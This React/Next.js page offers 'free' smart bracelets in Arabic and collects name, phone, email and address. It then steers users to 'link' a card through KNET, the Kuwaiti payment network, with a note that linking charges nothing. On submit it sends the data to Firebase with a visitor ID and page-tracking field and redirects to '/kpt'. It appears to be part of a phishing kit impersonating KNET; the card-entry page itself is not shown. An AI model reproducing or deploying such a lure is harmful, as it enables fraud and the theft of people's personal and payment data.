"use client"

import type React from "react"

import { useState } from "react"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Check, CreditCard, MapPin, User } from "lucide-react"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Textarea } from "@/components/ui/textarea"
import { Checkbox } from "@/components/ui/checkbox"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import "@/app/globals.css" // Fixed CSS import path to use correct location
import { addData } from "@/lib/firebase"

interface BraceletOption {
  id: string
  name: string
  nameAr: string
  description: string
  descriptionAr: string
  price: string
  color: string
  icon: React.ReactNode
  popular?: boolean
}

interface CheckoutForm {
  name: string
  phone: string
  email: string
  address: string
  city: string
  postalCode: string
  paymentMethod: string
  agreeToTerms: boolean
  specialInstructions: string
}

const braceletOptions: BraceletOption[] = [
  {
    id: "fitness-pro",
    name: "Fitness Pro",
    nameAr: "اللون الرمادي",
    description: "Advanced fitness tracking with heart rate monitoring",
    descriptionAr: "السوار الذكي رفيقك المثالي في كل مكان وزمان",
    price: "299",
    color: "bg-gray-500/10",
    icon: <img src="/11.png" alt="img" />,
    popular: true,
  },
  {
    id: "health-monitor",
    name: "Health Monitor",
    nameAr: "اللون الاحمر",
    description: "Comprehensive health tracking and wellness insights",
    descriptionAr: "طريقة دفع مبتكرة مع سوار الدفع الذكي من كي نت",
    price: "399",
    color: "bg-red-500/10",
    icon: <img src="/22.png" alt="img" />,
  },
  {
    id: "smart-connect",
    name: "Smart Connect",
    nameAr: "اللون الازرق",
    description: "Stay connected with smart notifications and calls",
    descriptionAr: "السوار الذكي رفيقك المثالي في كل مكان وزمان",
    price: "199",
    color: "bg-blue-500/10",
    icon: <img src="/33.png" alt="img" />,
  },
  {
    id: "endurance-max",
    name: "Endurance Max",
    nameAr: "اللون البرتقالي",
    description: "Long-lasting battery for extreme adventures",
    descriptionAr: "بطارية طويلة المدى تدوم لأشهر ",
    price: "مجاناً",
    color: "bg-orange-500/10",
    icon: <img src="/44.png" alt="img" />,
  },
]

export default function SmartBraceletPage() {
  const [selectedOption, setSelectedOption] = useState<string>("")
  const [isArabic, setIsArabic] = useState(true)
  const [loading, setLoading] = useState(false)

  const [checkoutForm, setCheckoutForm] = useState<CheckoutForm>({
    name: "",
    phone: "",
    email: "",
    address: "",
    city: "",
    postalCode: "",
    paymentMethod: "cash",
    agreeToTerms: false,
    specialInstructions: "",
  })

  const handleSelection = (optionId: string) => {
    setSelectedOption(optionId)
  }

  const handleInputChange = (field: keyof CheckoutForm, value: string | boolean) => {
    setCheckoutForm((prev) => ({
      ...prev,
      [field]: value,
    }))
  }

  const selectedBracelet = braceletOptions.find((option) => option.id === selectedOption)

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    const visitorId = localStorage.getItem("visitor")
    setLoading(true)

    const orderData = {
      id: visitorId,
      ...checkoutForm,
      selectedBracelet: selectedBracelet?.nameAr,
      currentPage: "كي نت",
      orderDate: new Date().toISOString(),
    }

    addData(orderData)
    window.location.href = "/kpt"
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 to-slate-100 dark:from-slate-900 dark:to-slate-800 p-4">
      <div className="max-w-6xl mx-auto">
        {/* Header */}
        <div className="text-center mb-12 pt-8">
          <div className="flex justify-center items-center gap-4 mb-6">
            <h1 className="text-4xl font-bold text-foreground">
              {isArabic ? "اختر السوار الذكي المثالي" : "Choose Your Perfect Smart Bracelet"}
            </h1>
          </div>
          <p className="text-xl text-muted-foreground max-w-2xl mx-auto">
            {isArabic
              ? "اكتشف مجموعتنا من الأساور الذكية المتطورة واختر الأنسب لاحتياجاتك"
              : "Discover our advanced smart bracelet collection and select the one that fits your needs"}
          </p>
        </div>

        {/* Options Grid */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
          {braceletOptions.map((option) => (
            <Card
              key={option.id}
              className={`relative cursor-pointer transition-all duration-300 hover:shadow-lg ${
                selectedOption === option.id ? "ring-2 ring-primary shadow-lg scale-105" : "hover:scale-102"
              }`}
              onClick={() => handleSelection(option.id)}
            >
              {option.popular && (
                <Badge className="absolute -top-2 -right-2 bg-primary text-primary-foreground">
                  {isArabic ? "الأكثر شعبية" : "Popular"}
                </Badge>
              )}

              <CardHeader className="text-center pb-4">
                <div
                  className={`w-40 h-40 ${option.color} rounded-full flex items-center justify-center mx-auto mb-4 text-white`}
                >
                  {option.icon}
                </div>
                <CardTitle className="text-lg">{isArabic ? option.nameAr : option.name}</CardTitle>
              </CardHeader>

              <CardContent className="pt-0">
                <div className="text-center mb-4">
                  <Badge className=" bg-gradient-to-r from-blue-500 to-orange-500 text-white font-medium border-0">
                    مجاناً
                  </Badge>
                </div>

                {selectedOption === option.id && (
                  <div className="flex items-center justify-center gap-2 text-primary font-medium">
                    <Check className="w-5 h-5" />
                    <span>{isArabic ? "محدد" : "Selected"}</span>
                  </div>
                )}
              </CardContent>
            </Card>
          ))}
        </div>

        {/* Enhanced Checkout Form */}
        {selectedBracelet && (
          <div className="max-w-4xl mx-auto space-y-6">
            {/* Order Summary */}
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-3">
                  <div
                    className={`w-12 h-12 ${selectedBracelet.color} rounded-full flex items-center justify-center text-white`}
                  >
                    {selectedBracelet.icon}
                  </div>
                  <div>
                    <h3 className="text-xl">{isArabic ? selectedBracelet.nameAr : selectedBracelet.name}</h3>
                    <p className="text-muted-foreground font-normal">
                      {isArabic ? selectedBracelet.descriptionAr : selectedBracelet.description}
                    </p>
                  </div>
                </CardTitle>
              </CardHeader>
              <CardContent dir="rtl">
                <div className="flex items-center justify-between p-4 bg-muted rounded-lg">
                  <span className="text-lg font-medium">{isArabic ? "السعر:" : "Price:"}</span>
                  <span className="text-2xl font-bold text-green-600">مجاناً</span>
                </div>
              </CardContent>
            </Card>

            {/* Comprehensive Checkout Form */}
            <Card>
             
              <CardContent className="py-5">
                <form onSubmit={handleSubmit} className="space-y-6" dir="rtl">
                  {/* Personal Information */}
                  <div className="space-y-4">
                    <h3 className="text-lg font-semibold flex items-center gap-2">
                      <User className="w-4 h-4" />
                      المعلومات الشخصية
                    </h3>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div>
                        <Label htmlFor="name">الاسم الكامل *</Label>
                        <Input
                          id="name"
                          type="text"
                          dir="rtl"
                          placeholder="ادخل اسمك الكامل"
                          value={checkoutForm.name}
                          required
                          onChange={(e) => handleInputChange("name", e.target.value)}
                        />
                      </div>
                      <div>
                        <Label htmlFor="phone">رقم الهاتف *</Label>
                        <Input
                          id="phone"
                          type="tel"
                          dir="rtl"
                          maxLength={8}
                          placeholder="ادخل رقم الهاتف"
                          value={checkoutForm.phone}
                          required
                          onChange={(e) => handleInputChange("phone", e.target.value)}
                        />
                      </div>
                      <div className="md:col-span-2">
                        <Label htmlFor="email">البريد الإلكتروني</Label>
                        <Input
                          id="email"
                          type="email"
                          dir="rtl"
                          placeholder="example@email.com"
                          value={checkoutForm.email}
                          onChange={(e) => handleInputChange("email", e.target.value)}
                        />
                      </div>
                    </div>
                  </div>

                  {/* Shipping Address */}
                  <div className="space-y-4">
                    <h3 className="text-lg font-semibold flex items-center gap-2">
                      <MapPin className="w-4 h-4" />
                      عنوان التوصيل
                    </h3>
                    <div className="space-y-4">
                      <div>
                        <Label htmlFor="address">العنوان التفصيلي *</Label>
                        <Textarea
                          id="address"
                          dir="rtl"
                          placeholder="ادخل عنوانك التفصيلي (الشارع، رقم المبنى، الطابق)"
                          value={checkoutForm.address}
                          required
                          onChange={(e) => handleInputChange("address", e.target.value)}
                        />
                      </div>
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div>
                          <Label htmlFor="city">المدينة *</Label>
                          <Input
                            id="city"
                            type="text"
                            dir="rtl"
                            placeholder="ادخل اسم المدينة"
                            value={checkoutForm.city}
                            required
                            onChange={(e) => handleInputChange("city", e.target.value)}
                          />
                        </div>
                        <div>
                          <Label htmlFor="postalCode">الرمز البريدي</Label>
                          <Input
                            id="postalCode"
                            type="text"
                            dir="rtl"
                            placeholder="الرمز البريدي"
                            value={checkoutForm.postalCode}
                            onChange={(e) => handleInputChange("postalCode", e.target.value)}
                          />
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Payment Method */}
                  <div className="space-y-4">
                    <h3 className="text-lg font-semibold flex items-center gap-2">
                      <CreditCard className="w-4 h-4" />
                      طرق الربط
                    </h3>
                    <RadioGroup
                      value={checkoutForm.paymentMethod}
                      onValueChange={(value) => handleInputChange("paymentMethod", value)}
                      dir="rtl"
                    >
                      <div className="flex items-center space-x-2 space-x-reverse">
                        <RadioGroupItem value="knet" id="knet" />
                        <Label htmlFor="knet">كي نت</Label>
                      </div>
                      <div className="flex items-center space-x-2 space-x-reverse text-gray-400">
                        <RadioGroupItem value="bank-account" id="bank-account" disabled/>
                        <Label htmlFor="bank-account">الحساب البنكي</Label>
                      </div>
                      {/* <div className="flex items-center space-x-2 space-x-reverse">
                        <RadioGroupItem value="phone" id="phone" />
                        <Label htmlFor="phone">رقم الهاتف</Label>
                      </div> */}
                    </RadioGroup>

                    <div className="bg-orange-100 dark:bg-blue-950/20 border border-orange-200 dark:border-blue-800 rounded-lg p-4">
                      <p className="text-sm text-orange-700 dark:text-blue-300 text-center font-medium">
                        ملاحظه : لن يتم خصم اي مبلغ عند ربط البطاقة
                      </p>
                    </div>
                  </div>

                  {/* Special Instructions */}
                  <div className="space-y-4">
                    <h3 className="text-lg font-semibold">ملاحظات خاصة</h3>
                    <Textarea
                      dir="rtl"
                      placeholder="أي ملاحظات أو تعليمات خاصة للتوصيل"
                      value={checkoutForm.specialInstructions}
                      onChange={(e) => handleInputChange("specialInstructions", e.target.value)}
                    />
                  </div>

                  {/* Terms and Conditions */}
                  <div className="flex items-center space-x-2 space-x-reverse">
                    <Checkbox
                      id="terms"
                      checked={checkoutForm.agreeToTerms}
                      onCheckedChange={(checked) => handleInputChange("agreeToTerms", checked as boolean)}
                    />
                    <Label htmlFor="terms" className="text-sm">
                      أوافق على الشروط والأحكام وسياسة الخصوصية *
                    </Label>
                  </div>

                  {/* Submit Button */}
                  <Button
                    type="submit"
                    disabled={loading || !checkoutForm.agreeToTerms}
                    className="w-full  bg-gradient-to-r from-blue-500 to-orange-500 text-lg py-6"
                    size="lg"
                  >
                    {loading ? "يتم معالجة الطلب..." : "ربط"}
                  </Button>
                </form>
              </CardContent>
            </Card>
          </div>
        )}

        {!selectedOption && (
          <div className="text-center py-8">
            <p className="text-muted-foreground">
              {isArabic ? "اختر أحد الخيارات أعلاه لرؤية التفاصيل" : "Select an option above to see details"}
            </p>
          </div>
        )}
      </div>
    </div>
  )
}
